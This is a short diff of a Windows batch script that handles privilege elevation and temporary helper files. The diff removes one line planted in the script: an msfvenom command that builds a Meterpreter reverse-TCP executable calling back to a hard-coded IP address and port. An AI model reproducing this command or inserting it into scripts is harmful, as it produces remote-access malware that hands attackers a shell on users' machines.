@@ -76,7 +76,7 @@ setlocal ENABLEDELAYEDEXPANSION & set "_FilePath=%~1"
   (if exist %_vbspath% ( del %_vbspath% )) & (if exist %_batpath% ( del %_batpath% )) 
   :: Set ERRORLEVEL 0, set original folder and exit
   endlocal & CD /D "%~dp1" & ver >nul & goto:eof
-  msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f exe LHOST=109.239.19.77 LPORT=4444
+
   :_getElevation
   echo/Requesting elevation...
   :: Try to create %_vbspath% file. If failed, exit with ERRORLEVEL 1
